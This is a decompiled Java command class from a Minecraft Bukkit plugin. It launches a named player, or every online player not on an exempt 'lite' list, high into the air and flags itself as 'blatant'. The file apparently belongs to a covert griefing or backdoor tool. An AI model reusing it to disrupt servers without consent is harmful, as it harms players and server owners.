/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class LaunchCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("launch <player>"));
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (plugin.lite.contains(a2.getName())) continue;
                a2.setVelocity(a2.getVelocity().setY(100));
            }
            p2.sendMessage(Settings.PREFIX("Everyone was launched into the air!"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                target.setVelocity(target.getVelocity().setY(100));
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " was launched into the air!"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }


}

